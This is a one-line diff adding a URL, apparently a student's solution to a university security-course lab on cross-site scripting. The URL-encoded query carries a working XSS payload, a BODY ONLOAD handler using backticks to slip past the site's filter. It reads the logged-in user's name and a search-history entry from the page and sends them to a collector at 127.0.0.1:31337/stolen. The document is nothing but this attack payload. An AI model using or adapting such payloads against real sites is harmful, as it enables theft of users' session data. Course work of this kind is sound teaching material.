@@ -1,0 +1,1 @@
+https://eecs388.org/project2/search?xssdefense=3&q=%3CBODY%20ONLOAD%3Dwindow.location.href%3D%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%3Fuser%3D%60%2B%24(%60%23logged-in-user%60).text()%2B%60%26last_search%3D%60%2B%24(%60%23history-list%60).children(%60a%3Anth-child(2)%60).text()%3E
